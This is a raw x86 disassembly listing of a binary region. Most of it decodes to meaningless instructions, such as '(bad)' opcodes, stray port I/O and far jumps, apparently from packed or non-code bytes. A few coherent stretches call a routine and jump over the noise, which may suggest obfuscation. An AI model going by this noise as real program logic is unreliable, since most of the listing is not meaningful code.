  413177:	rcr    ecx,cl
  413179:	adc    al,0x86
  41317b:	test   dh,bh
  41317d:	out    dx,eax
  41317e:	mov    DWORD PTR [ebp+0x3dd73cef],ebx
  413184:	loope  0x413123
  413186:	sub    DWORD PTR [edx+0x76],0xffffffb3
  41318a:	fidivr DWORD PTR [edx+edi*4+0x3a7d9718]
  413191:	mov    WORD PTR [ebp-0x57],?
  413194:	call   0xee07:0xb7806eb3
  41319b:	dec    eax
  41319c:	and    ah,BYTE PTR [edi+0x55]
  41319f:	xchg   ebx,eax
  4131a0:	mov    eax,0x61137cde
  4131a5:	cmc    
  4131a6:	push   eax
  4131a7:	sbb    cl,BYTE PTR [edi-0x1a]
  4131aa:	out    0x10,eax
  4131ac:	test   al,0x97
  4131ae:	mov    esi,0xe439b860
  4131b3:	je     0x413159
  4131b5:	add    dh,BYTE PTR cs:[ebx+0x28102b6a]
  4131bc:	xchg   BYTE PTR [eax-0x39],bh
  4131bf:	xor    dh,bh
  4131c1:	enter  0x5fe7,0x52
  4131c5:	jne    0x413216
  4131c7:	mov    ch,0x5c
  4131c9:	or     DWORD PTR [ebx],esi
  4131cb:	stos   BYTE PTR es:[edi],al
  4131cc:	push   esi
  4131cd:	fisubr DWORD PTR [eax-0x4d]
  4131d0:	outs   dx,DWORD PTR ds:[esi]
  4131d1:	aaa    
  4131d2:	jmp    0x413232
  4131d4:	or     eax,0x389b4f7d
  4131d9:	rcr    edx,1
  4131db:	pop    es
  4131dc:	push   eax
  4131dd:	adc    BYTE PTR [esi],cl
  4131df:	xchg   ecx,eax
  4131e0:	cdq    
  4131e1:	je     0x413175
  4131e3:	mov    ds:0x6efda379,al
  4131e8:	push   eax
  4131e9:	fiadd  DWORD PTR [esi+0x37]
  4131ec:	mov    BYTE PTR [eax],al
  4131ee:	fidivr DWORD PTR [edx-0x23408a51]
  4131f4:	jno    0x41324d
  4131f6:	mov    ah,0x40
  4131f8:	jae    0x413264
  4131fa:	std    
  4131fb:	add    edx,DWORD PTR ds:0x4b44b6c3
  413201:	mov    ds:0xcfda9767,eax
  413206:	mov    ebp,0x4ff84712
  41320b:	les    ebp,FWORD PTR [ebx]
  41320d:	or     al,0x7a
  41320f:	mov    dh,0x22
  413211:	(bad)  
  413212:	and    eax,0xdf82c703
  413217:	rol    BYTE PTR [ebx],1
  413219:	cmp    al,0xdc
  41321b:	int3   
  41321c:	mov    ds:0xa52b5857,eax
  413221:	rol    DWORD PTR [ebx],0x58
  413224:	cs add ecx,ebx
  413227:	push   0x48c9e7e3
  41322c:	jmp    0xae4f443a
  413231:	bound  esi,QWORD PTR [edx+0x5c]
  413234:	xchg   BYTE PTR [ebp+0xc960dd7],ah
  41323a:	mov    dh,0x1a
  41323c:	inc    ecx
  41323d:	ror    BYTE PTR [ebp-0x13405b6b],1
  413243:	in     eax,dx
  413244:	sub    al,0x23
  413246:	add    al,BYTE PTR ds:0x129c3d8f
  41324c:	sar    DWORD PTR [ebp+0x70],cl
  41324f:	idiv   DWORD PTR [ecx-0x53536c0c]
  413255:	call   0xc17aa02b
  41325a:	or     DWORD PTR [ecx+edx*1],ebp
  41325d:	xlat   BYTE PTR fs:[ebx]
  41325f:	mov    ch,0xbb
  413261:	push   cs
  413262:	adc    eax,0xc1e4d36
  413267:	push   esi
  413268:	shl    BYTE PTR [esp+ecx*4+0xf15d7f8],cl
  41326f:	mov    esi,0xe9247add
  413274:	iret   
  413275:	mov    BYTE PTR [edx+0x4edf2dc0],al
  41327b:	std    
  41327c:	arpl   WORD PTR [eax-0x21ad7645],di
  413282:	daa    
  413283:	retf   
  413284:	mov    esp,0x64afb63b
  413289:	or     BYTE PTR ds:0xa968066c,cl
  41328f:	mov    ds:0x70c25716,eax
  413294:	push   cs
  413295:	lahf   
  413296:	fs inc esp
  413298:	ja     0x4132a2
  41329a:	xchg   ebp,eax
  41329b:	sub    cl,BYTE PTR [edx+ebp*4]
  41329e:	push   edx
  41329f:	sbb    esp,edi
  4132a1:	imul   eax,DWORD PTR [eax+0x1da8d63c],0xffffffba
  4132a8:	sti    
  4132a9:	add    eax,0xa99a37ae
  4132ae:	enter  0x2c21,0x1c
  4132b2:	cs icebp 
  4132b4:	rcr    edi,0xf4
  4132b7:	push   DWORD PTR [ecx+0x3e7a1c1c]
  4132bd:	sbb    al,0xc7
  4132bf:	imul   eax,DWORD PTR [eax],0x404fd602
  4132c5:	mov    edi,0x47c71f55
  4132ca:	jl     0x413289
  4132cc:	xor    BYTE PTR [edx],bl
  4132ce:	retf   0xa6a2
  4132d1:	shr    DWORD PTR [ebx-0x5a],1
  4132d4:	(bad)
  4132d8:	cli    
  4132d9:	adc    al,al
  4132db:	push   ebx
  4132dc:	(bad)  
  4132dd:	dec    edx
  4132de:	adc    ch,BYTE PTR [ebx+0x1b24db4d]
  4132e4:	ins    BYTE PTR es:[edi],dx
  4132e5:	sar    ch,0x25
  4132e8:	das    
  4132e9:	mov    ds,WORD PTR [edi]
  4132eb:	out    dx,eax
  4132ec:	add    ch,dh
  4132ee:	gs jne 0x413341
  4132f1:	nop
  4132f2:	dec    ecx
  4132f3:	mov    dh,0x96
  4132f5:	std    
  4132f6:	jmp    0x93cf8035
  4132fb:	dec    edx
  4132fc:	or     DWORD PTR [edi-0x73],0xffffff8e
  413300:	and    eax,0xede9582e
  413305:	sub    esp,edi
  413307:	mov    WORD PTR [eax+0x26d1719f],gs
  41330d:	fidivr DWORD PTR [esi+0x57c50c8a]
  413313:	ja     0x41331b
  413315:	adc    ah,BYTE PTR [edi+0x7da69f03]
  41331b:	or     BYTE PTR [ebx-0x8e5cc25],ch
  413321:	pusha  
  413322:	lahf   
  413323:	mov    bh,0xdf
  413325:	es mov ebp,0x4765cb99
  41332b:	dec    esp
  41332c:	arpl   WORD PTR [esi],si
  41332e:	xor    eax,ecx
  413330:	ss xor al,0xdf
  413333:	jmp    0x413306
  413335:	xor    DWORD PTR [eax+ebp*4-0x29],esp
  413339:	push   0xac33dc45
  41333e:	jmp    0xfe2b:0x423033e4
  413345:	dec    ebp
  413346:	in     al,0xff
  413348:	sbb    DWORD PTR [eax-0x303d17d5],ebx
  41334e:	pop    esi
  41334f:	(bad)  
  413350:	stc    
  413351:	xchg   ebx,eax
  413352:	inc    ebx
  413353:	push   ebx
  413354:	mov    edx,0x55eae976
  413359:	shr    DWORD PTR [esp+ebx*1-0x395efac1],0xb7
  413361:	jae    0x413353
  413363:	iret   
  413364:	(bad)  
  413365:	(bad)  
  413366:	lock pop ebp
  413368:	sub    al,0x8e
  41336a:	je     0x41334b
  41336c:	dec    edi
  41336d:	jno    0x4133b9
  41336f:	push   eax
  413370:	adc    DWORD PTR [ebp+eax*1+0x1d4c6045],edi
  413377:	leave  
  413378:	dec    esp
  413379:	or     DWORD PTR [esi+0x2d],0x2c
  41337d:	cwde   
  41337e:	inc    eax
  41337f:	(bad)  
  413381:	inc    esp
  413382:	scas   al,BYTE PTR es:[edi]
  413383:	nop
  413384:	jo     0x41334f
  413386:	xor    BYTE PTR [ebx],dl
  413388:	test   eax,0xf21ce91
  41338d:	jne    0x4133cf
  41338f:	ins    BYTE PTR es:[edi],dx
  413390:	dec    ebp
  413391:	pop    es
  413392:	into   
  413393:	xchg   edx,eax
  413394:	mov    dl,0xe5
  413396:	aam    0xf6
  413398:	push   ecx
  413399:	repz and eax,0x817b6e88
  41339f:	aam    0x3c
  4133a1:	mov    al,0x7e
  4133a3:	cmc    
  4133a4:	xchg   dl,cl
  4133a6:	fwait
  4133a7:	mov    esi,0x52c17aba
  4133ac:	fisub  WORD PTR [edi]
  4133ae:	sahf   
  4133af:	es into 
  4133b1:	dec    esp
  4133b2:	sub    DWORD PTR [edx-0x53],edi
  4133b5:	ficom  WORD PTR [edi-0x7a5db15d]
  4133bb:	push   cs
  4133bc:	and    al,BYTE PTR [ecx+0x54]
  4133bf:	dec    eax
  4133c0:	outs   dx,BYTE PTR ds:[esi]
  4133c1:	xchg   ax,ax
  4133c3:	pop    ecx
  4133c4:	fisttp WORD PTR [ebp+eiz*4+0x11]
  4133c8:	push   eax
  4133c9:	aad    0x1f
  4133cb:	jno    0x4133dc
  4133cd:	or     DWORD PTR ds:0x3d9c335b,esp
  4133d3:	je     0x413443
  4133d5:	(bad)  [eax-0x68]
  4133d8:	test   al,0xca
  4133da:	mov    eax,ds:0xb2b4ac9d
  4133df:	dec    ecx
  4133e0:	mov    esi,esi
  4133e2:	retf   
  4133e3:	repz out 0xf5,eax
  4133e6:	adc    al,0xc2
  4133e8:	mov    dl,0x76
  4133ea:	in     al,0x70
  4133ec:	mov    ?,WORD PTR [ebx-0x37e7fc31]
  4133f2:	arpl   WORD PTR [edi+0x63],ax
  4133f5:	xor    ecx,edi
  4133f7:	outs   dx,DWORD PTR ds:[esi]
  4133f8:	cmp    DWORD PTR [ebx],ebp
  4133fa:	push   ecx
  4133fb:	mov    dl,BYTE PTR [eax]
  4133fd:	fs mov bl,0x71
  413400:	enter  0x6cd8,0x48
  413404:	sbb    bl,BYTE PTR [ecx]
  413406:	addr16 out 0x9e,eax
  413409:	popf   
  41340a:	ins    DWORD PTR es:[edi],dx
  41340b:	mov    ch,0xff
  41340d:	inc    ebp
  41340e:	fadd   DWORD PTR [ecx+esi*1-0x3e]
  413412:	ja     0x413434
  413414:	sub    eax,0x1e7dc34
  413419:	iret   
  41341a:	cmp    BYTE PTR [edi],ah
  41341c:	sbb    eax,0x1bfe623e
  413421:	pop    ds
  413422:	loopne 0x4133aa
  413424:	in     eax,0x36
  413426:	pop    edx
  413427:	mov    al,0xfb
  413429:	pop    es
  41342a:	mov    bh,cl
  41342c:	cld    
  41342d:	sbb    al,BYTE PTR [edx-0x552b0cfa]
  413433:	cs xor eax,0xc89ed0ab
  413439:	std    
  41343a:	iret   
  41343b:	xchg   DWORD PTR [edi-0x21],ebp
  41343e:	mov    ebx,0x1db153a1
  413443:	and    BYTE PTR [esi-0x8],bl
  413446:	dec    edx
  413447:	cmp    ch,BYTE PTR [edi-0x6d]
  41344a:	loopne 0x4134b5
  41344c:	sar    DWORD PTR [ebx+0x3f],1
  41344f:	add    DWORD PTR ds:0x58ad75e,ecx
  413455:	sub    al,0x3c
  413458:	jnp    0x4134d2
  41345a:	shl    BYTE PTR [esi+0x69],1
  41345d:	test   al,0x0
  41345f:	ror    BYTE PTR [edx+0x7],0xea
  413463:	pop    ss
  413464:	dec    ecx
  413465:	xlat   BYTE PTR ds:[ebx]
  413466:	fnstenv [ebx-0x3d]
  413469:	add    al,0x4e
  41346b:	es push eax
  41346d:	adc    esp,DWORD PTR [esi-0x4ee457a2]
  413473:	dec    ebx
  413474:	xor    BYTE PTR [edx-0x12],ah
  413477:	lahf   
  413478:	mov    edx,0xf50872a7
  41347d:	fs push ebp
  41347f:	int3   
  413480:	and    eax,0x92878290
  413485:	push   edx
  413486:	cmp    BYTE PTR [ebp+0x2f5aa2ce],dh
  41348c:	push   es
  41348d:	cwde   
  41348e:	xchg   esi,eax
  41348f:	ret    0xc613
  413492:	adc    eax,0x6024793c
  413497:	inc    edx
  413498:	das    
  413499:	fisubr DWORD PTR [eax+0x17cfd76e]
  41349f:	add    dh,0x4b
  4134a2:	cmp    BYTE PTR [ecx+0x74],bh
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x422072
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x100c8f61]
  4134d4:	(bad)  
  4134d5:	jo     0x41353b
  4134d7:	inc    edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [esi-0x78],dl
  4134e0:	clc    
  4134e1:	cs sbb al,0x89
  4134e4:	neg    dh
  4134e6:	cmp    eax,DWORD PTR [ebp+0x5a]
  4134e9:	mov    dl,0xe0
  4134eb:	mov    ?,WORD PTR [eax-0x20]
  4134ee:	jmp    0x413511
  4134f0:	xchg   ecx,esp
  4134f2:	in     eax,dx
  4134f3:	push   es
  4134f4:	cmp    ah,BYTE PTR [ebx-0x5f8641ec]
  4134fa:	adc    eax,0x6a48dc7d
  4134ff:	in     eax,dx
  413500:	jg     0x41357b
  413502:	mov    eax,0x737fcab2
  413507:	xchg   ecx,eax
  413508:	shr    BYTE PTR ds:0x6acfd5b,cl
  41350e:	pop    ebx
  41350f:	ins    DWORD PTR es:[edi],dx
  413510:	pop    ds
  413511:	push   es
  413512:	repz push eax
  413514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413515:	es ins BYTE PTR es:[edi],dx
  413517:	loope  0x413554
  413519:	push   eax
  41351a:	out    0x8d,eax
  41351c:	test   DWORD PTR [esi],edx
  41351e:	rcl    ah,1
  413520:	sar    DWORD PTR [esi],1
  413522:	adc    eax,0xd36a20b4
  413527:	out    0xad,eax
  413529:	ins    DWORD PTR es:[edi],dx
  41352a:	xchg   esp,eax
  41352b:	test   DWORD PTR [esi+0x207bbd89],esi
  413531:	into   
  413532:	adc    ebx,esi
  413534:	mov    ebx,0x3fe95c69
  413539:	push   edx
  41353a:	jmp    0x4134fe
  41353c:	(bad)  [edx-0x253f9734]
  413542:	(bad)  
  413543:	test   eax,0x4d7b1750
  413548:	test   al,0x84
  41354a:	(bad)  
  41354b:	shl    DWORD PTR [ebp-0x51],cl
  41354e:	mov    WORD PTR [eax+edi*8-0xe8c116a],?
  413555:	cmp    bh,BYTE PTR [ecx+0xebc6794]
  41355b:	sbb    edi,DWORD PTR [ecx+ebx*8+0x8]
  41355f:	pop    ds
  413560:	ret    
  413561:	addr16 nop
  413563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413564:	or     BYTE PTR cs:[ebp+ebx*8-0x33],0xd7
  41356a:	jnp    0x41351a
  41356c:	repz data16 aas 
  41356f:	cdq    
  413570:	cmp    al,0x47
  413572:	mov    esi,0xf5b90f5a
  413577:	inc    esp
  413578:	scas   al,BYTE PTR es:[edi]
  413579:	xor    DWORD PTR [ecx-0x27de023],ecx
  41357f:	retf   0x6602
  413582:	push   ebp
  413583:	mov    al,ds:0xfad834b
  413588:	pop    ecx
  413589:	daa    
  41358a:	dec    ebx
  41358b:	push   ds
  41358c:	clc    
  41358d:	aam    0xd0
  41358f:	call   0xca23f069
  413594:	jns    0x413528
  413596:	cmp    al,0x6b
  413598:	mov    BYTE PTR [esi+edx*2+0x69],cl
  41359c:	push   ebp
  41359d:	inc    esi
  41359e:	xchg   DWORD PTR [ecx-0x3f5f593b],esp
  4135a4:	bound  esp,QWORD PTR [ebp+0x3b]
  4135a7:	fild   WORD PTR [edx+0x4e]
  4135aa:	mov    al,ds:0xefbcd36c
  4135af:	xchg   edi,eax
  4135b0:	dec    eax
  4135b1:	neg    DWORD PTR [ebp+ebp*2-0xf]
  4135b5:	xor    esi,ecx
  4135b7:	push   esi
  4135b8:	add    eax,0xb5ec36bc
  4135bd:	adc    ecx,eax
  4135bf:	adc    ah,BYTE PTR [edx+edi*4+0x2cb8e788]
  4135c6:	mov    eax,0xac9e6d38
  4135cb:	sub    al,0xc4
  4135cd:	cld    
  4135ce:	add    cl,BYTE PTR [eax-0x49a90abb]
  4135d4:	fldcw  WORD PTR ds:0x83f255a9
  4135da:	pusha  
  4135db:	mov    ebx,0x8619e620
  4135e0:	into   
  4135e1:	cwde   
  4135e2:	nop
  4135e3:	fstp   TBYTE PTR [esi-0x61]
  4135e6:	scas   al,BYTE PTR es:[edi]
  4135e7:	xchg   esi,eax
  4135e8:	test   al,0x29
  4135ea:	push   ebp
  4135eb:	jnp    0x413578
  4135ed:	sub    eax,0xdfb0f1a6
  4135f2:	dec    ecx
  4135f3:	pop    edx
  4135f4:	and    edx,DWORD PTR [eax+0x60]
  4135f7:	sbb    eax,0x83a2573
  4135fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135fd:	pop    edx
  4135fe:	cmp    al,BYTE PTR [ebp+0xcce695e]
  413604:	jmp    0x5a25:0xb6d2b5e5
  41360b:	fadd   st,st(6)
  41360d:	jg     0x4135d2
  41360f:	loope  0x41359a
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413613:	jb     0x413686
  413615:	and    BYTE PTR [ebx-0x25d57fe1],cl
  41361b:	scas   eax,DWORD PTR es:[edi]
  41361c:	xchg   esi,eax
  41361d:	jmp    0x4135ab
  41361f:	pop    ebp
  413620:	jns    0x413606
  413622:	(bad)  
  413624:	test   ebp,ecx
  413626:	mov    ebx,DWORD PTR [ebx+0x6e]
  413629:	sub    BYTE PTR [edi+0xf980d72],ch
  41362f:	fsqrt  
  413631:	fld    DWORD PTR [edx-0x5d540498]
  413637:	xchg   BYTE PTR [eax+0x76072c45],ah
  41363d:	idiv   DWORD PTR [edx+0x19]
  413640:	cmp    dh,0x1a
  413643:	add    DWORD PTR [edx],ecx
  413645:	out    dx,al
  413646:	lods   eax,DWORD PTR ds:[esi]
  413647:	jbe    0x413647
  413649:	pop    esp
  41364a:	aam    0x79
  41364c:	call   0x34cc8b17
  413651:	lods   al,BYTE PTR ds:[esi]
  413652:	in     eax,0xea
  413654:	lock inc esp
  413656:	xor    eax,0x45a7a59c
  41365b:	cmp    DWORD PTR [ebx],ebp
  41365d:	mov    BYTE PTR [esi-0x24aa78a6],bl
  413663:	adc    eax,0xdb01f2b1
  413668:	pusha  
  413669:	pop    es
  41366a:	ins    BYTE PTR es:[edi],dx
  41366b:	daa    
  41366c:	pop    esi
  41366d:	push   0xed52b23a
  413672:	aad    0x39
  413674:	sbb    al,0x16
  413676:	std    
  413677:	mov    edx,0x727e5522
  41367c:	pop    esp
  41367d:	xchg   edi,eax
  41367e:	inc    ebp
  41367f:	inc    edi
  413680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413682:	mov    BYTE PTR [edx+ebx*1+0x65ee1002],ch
  413689:	loope  0x413661
  41368b:	adc    al,0xde
  41368d:	sbb    al,0xa
  41368f:	lea    ebp,[ebp+edx*2+0xb6bd360]
  413696:	rcr    BYTE PTR [ecx],cl
  413698:	pop    esi
  413699:	lds    ecx,FWORD PTR [eax+0x6e352dd6]
  41369f:	rcl    DWORD PTR ds:0x6021fbd5,cl
  4136a5:	mov    ebp,0x537404d0
  4136aa:	lds    ebx,FWORD PTR [esi]
  4136ac:	cmp    eax,0x8230f817
  4136b1:	(bad)
  4136b4:	inc    eax
  4136b5:	and    cl,BYTE PTR [ecx]
  4136b7:	mov    bh,0xae
  4136b9:	inc    esp
  4136ba:	xor    ah,bl
  4136bc:	stos   DWORD PTR es:[edi],eax
  4136bd:	sub    eax,0xcc7fcfb7
  4136c2:	mov    bh,0x3
  4136c4:	hlt    
  4136c5:	xchg   esp,eax
  4136c6:	cmc    
  4136c7:	clc    
  4136c8:	mov    ebx,0x1d4b15c8
  4136cd:	add    ebp,DWORD PTR fs:0xf3a8d6f3
  4136d4:	fild   QWORD PTR [edx-0x5a]
  4136d7:	push   esp
  4136d8:	dec    ecx
  4136d9:	cmp    bh,BYTE PTR [eax]
  4136db:	dec    ebx
  4136dc:	xchg   ebx,eax
  4136dd:	inc    edx
  4136de:	loopne 0x413668
  4136e0:	inc    esp
  4136e1:	dec    edx
  4136e2:	push   es
  4136e3:	jnp    0x4136f8
  4136e5:	mov    DWORD PTR [ecx],ecx
  4136e7:	int3   
  4136e8:	in     eax,dx
  4136e9:	in     eax,0x6e
  4136eb:	test   BYTE PTR ss:0x497a928c,ch
  4136f2:	dec    esp
  4136f3:	fwait
  4136f4:	add    al,0x24
  4136f6:	add    BYTE PTR ds:0xa9804841,ch
  4136fc:	sub    bh,BYTE PTR [edi+0x55ad19a8]
  413702:	fild   DWORD PTR [ebp-0x12]
  413705:	dec    ebp
  413706:	and    al,0x59
  413708:	shr    BYTE PTR [ebp-0x1e],0x4
  41370c:	push   ebx
  41370d:	ja     0x4136e3
  41370f:	call   eax
  413711:	mov    ch,0xf7
  413713:	adc    ch,BYTE PTR [esi+0x787b546d]
  413719:	add    esp,DWORD PTR [edi-0x2]
  41371c:	dec    edx
  41371d:	loope  0x4136c1
  41371f:	sub    al,BYTE PTR [ecx]
  413721:	shr    BYTE PTR [esi-0x45f56157],0xf3
  413728:	pop    esp
  413729:	ret    
  41372a:	or     ecx,DWORD PTR [eax-0x7e]
  41372d:	xor    edi,eax
  41372f:	push   ebp
  413730:	aas    
  413731:	jmp    0x2ac86795
  413736:	out    dx,eax
  413737:	je     0x413740
  413739:	xchg   ebp,eax
  41373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41373b:	xor    DWORD PTR ds:[esp+edx*2+0x26874777],0xfffffffa
  413744:	xor    esp,DWORD PTR [edx+0x6afe3f51]
  41374a:	lahf   
  41374b:	push   eax
  41374c:	mov    ebp,0xa952ed1f
  413751:	inc    ebx
  413752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413753:	clc    
  413754:	sbb    eax,0x91fe29b6
  413759:	mov    ds:0x1b2bdce7,eax
  41375e:	fiadd  DWORD PTR [eax]
  413760:	dec    ebx
  413761:	loope  0x41378d
  413763:	(bad)  
  413765:	addr16 in al,0xb
  413768:	pop    esp
  413769:	fwait
  41376a:	nop
  41376b:	cmp    BYTE PTR [ebp+eax*8+0x43859bab],bl
  413772:	stos   DWORD PTR es:[edi],eax
  413773:	rcl    BYTE PTR [esi-0x12],0xd6
  413777:	xor    BYTE PTR [esi],al
  413779:	ja     0x413744
  41377b:	mov    edx,0x89b30990
  413780:	dec    eax
  413781:	mov    BYTE PTR [edi],al
  413783:	retf   0xf712
  413786:	dec    esi
  413787:	pusha  
  413788:	div    DWORD PTR [edi+0x5aa51057]
  41378e:	ret    
  41378f:	fisttp QWORD PTR [edi-0x38b1d0cc]
  413795:	xchg   ebx,eax
  413796:	daa    
  413797:	pusha  
  413798:	pushf  
  413799:	hlt    
  41379a:	lods   eax,DWORD PTR ds:[esi]
  41379b:	adc    al,0x57
  41379d:	cli    
  41379e:	es dec ebp
  4137a0:	pushf  
  4137a1:	mov    ds:0xb6e4efa8,al
  4137a6:	sbb    BYTE PTR [edx],ch
  4137a8:	cs push cs
  4137aa:	sub    al,0x15
  4137ac:	int3   
  4137ad:	fnstenv [edi*1-0x37982245]
  4137b4:	add    DWORD PTR [esi-0x41ef494c],edx
  4137ba:	retf   0x9ce5
  4137bd:	sub    esp,DWORD PTR [edi+0x6d]
  4137c0:	(bad)  
  4137c1:	leave  
  4137c2:	mov    BYTE PTR [esi],cl
  4137c4:	xchg   ebp,eax
  4137c5:	je     0x413835
  4137c7:	arpl   WORD PTR [eax],bx
  4137c9:	in     eax,0x18
  4137cb:	cld    
  4137cc:	jg     0x413761
  4137ce:	push   0xb53bdde2
  4137d3:	push   es
  4137d4:	popf   
  4137d5:	ds imul esi,eax,0x2e9dd33a
  4137dc:	add    bl,BYTE PTR [ebx+0x46]
  4137df:	icebp  
  4137e0:	inc    edx
  4137e1:	lods   al,BYTE PTR ds:[esi]
  4137e2:	jp     0x413768
  4137e4:	xor    al,0x73
  4137e6:	retf   
  4137e7:	push   esp
  4137e8:	sbb    eax,0x3e3e2b06
  4137ed:	dec    eax
  4137ee:	adc    eax,0x4d67b917
  4137f3:	(bad)  
  4137f4:	stos   DWORD PTR es:[edi],eax
  4137f5:	or     edx,ecx
  4137f7:	sbb    BYTE PTR [ecx-0x37c0a13d],al
  4137fd:	scas   eax,DWORD PTR es:[edi]
  4137fe:	aaa    
  4137ff:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  413801:	lds    ecx,FWORD PTR [edx-0x50]
  413804:	xchg   edx,eax
  413805:	and    eax,0xef78d455
  41380a:	mov    cl,0x74
  41380c:	ins    DWORD PTR es:[edi],dx
  41380d:	sbb    ecx,DWORD PTR [esi+0x53]
  413810:	stos   BYTE PTR es:[edi],al
  413811:	in     al,0x5c
  413813:	push   edx
  413814:	add    BYTE PTR [ebp+0x1f],bh
  413817:	dec    edi
  413818:	pusha  
  413819:	lods   al,BYTE PTR ds:[esi]
  41381a:	loop   0x413816
  41381c:	(bad)  
  41381d:	in     eax,dx
  41381e:	dec    edx
  41381f:	shl    ch,0xb8
  413822:	add    ecx,DWORD PTR [edi]
  413824:	cmp    eax,edx
  413826:	pop    esi
  413827:	fsubr  DWORD PTR [esi]
  413829:	repz les esi,FWORD PTR [esi-0x10363a5]
  413830:	lock dec esp
  413832:	sar    DWORD PTR [ebp+0x7edad8a1],1
  413838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413839:	in     eax,0x47
  41383b:	mov    cl,0x19
  41383d:	mov    BYTE PTR [ebx],ah
  41383f:	loop   0x41389a
  413841:	xchg   esp,eax
  413842:	test   BYTE PTR [edi+edx*4],al
  413845:	rcl    BYTE PTR [ecx],0x1b
  413848:	pop    ds
  413849:	std    
  41384a:	dec    bl
  41384c:	or     dl,bl
  41384e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384f:	jb     0x413880
  413851:	call   0x735aeb8f
  413856:	leave  
  413857:	pushf  
  413858:	dec    edi
  413859:	inc    eax
  41385a:	ins    BYTE PTR es:[edi],dx
  41385b:	dec    eax
  41385c:	sbb    BYTE PTR [ecx+0xa146633],dh
  413862:	and    dh,0xc9
  413865:	jo     0x413881
  413867:	mov    edi,0xfaa78eba
  41386c:	into   
  41386d:	dec    esi
  41386e:	pushf  
  41386f:	xchg   ebx,eax
  413870:	popa   
  413871:	iret   
  413872:	out    dx,al
  413873:	mov    ch,0xb3
  413875:	jae    0x4138a6
  413877:	and    ah,dl
  413879:	xchg   esi,eax
  41387a:	mov    esp,0x3abc2859
  41387f:	(bad)
  413882:	mov    ds:0xa75e6c73,al
  413887:	push   es
  413888:	and    bl,cl
  41388a:	mov    bh,0x4b
  41388c:	mov    ah,0x10
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	addr16 jl 0x413900
  413892:	sub    eax,0x76496fa6
  413897:	int    0x55
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x59],ebp
  4138e5:	retf   0xb081
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [ecx+0x3e2fb114],cl
  4138f5:	push   edx
  4138f6:	mov    ebp,DWORD PTR [esi-0x626cc792]
  4138fc:	and    eax,esp
  4138fe:	pop    esp
  4138ff:	mov    ecx,0x21b18f60
  413904:	ja     0x4138e7
  413906:	fs call 0x5489:0x571b06f7
  41390e:	leave  
  41390f:	rcr    BYTE PTR [edi-0x5447e080],cl
  413915:	xor    BYTE PTR [esi+0x30],bl
  413918:	mov    ecx,0xa2edc108
  41391d:	mov    al,ds:0xebbd9a23
  413922:	sbb    al,0x93
  413924:	call   0x42bc94ea
  413929:	aaa    
  41392a:	push   edx
  41392b:	pop    ecx
  41392c:	inc    ebp
  41392d:	aaa    
  41392e:	xchg   ecx,eax
  41392f:	sub    DWORD PTR [esi-0x63deeff0],ebp
  413935:	out    dx,eax
  413936:	aad    0xcb
  413938:	cld    
  413939:	sub    esi,DWORD PTR [edi+0x138a7b25]
  41393f:	and    BYTE PTR [edi],ah
  413941:	imul   esi,DWORD PTR [ecx+0x37],0xf578c0b3
  413948:	pushf  
  413949:	jge    0x4139bd
  41394b:	mov    bl,0xc3
  41394d:	pop    ecx
  41394e:	ret    0x8a38
  413951:	sbb    al,0xc3
  413953:	out    0x74,eax
  413955:	cld    
  413956:	shl    BYTE PTR [ebx],0x50
  413959:	lock shl bl,cl
  41395c:	out    dx,al
  41395d:	mov    ch,0x5
  41395f:	call   0xc1df:0xb7e0e99f
  413966:	inc    esp
  413967:	sub    eax,0x5ee50193
  41396c:	cmp    DWORD PTR [ecx+0x28],ebp
  41396f:	adc    edx,DWORD PTR [esi-0xc]
  413972:	jmp    0x41393c
  413974:	jno    0x413997
  413976:	adc    al,0x4a
  413978:	inc    ebx
  413979:	xchg   BYTE PTR [esi-0x3cf84ff9],dl
  41397f:	and    BYTE PTR [eax],dl
  413981:	pop    ecx
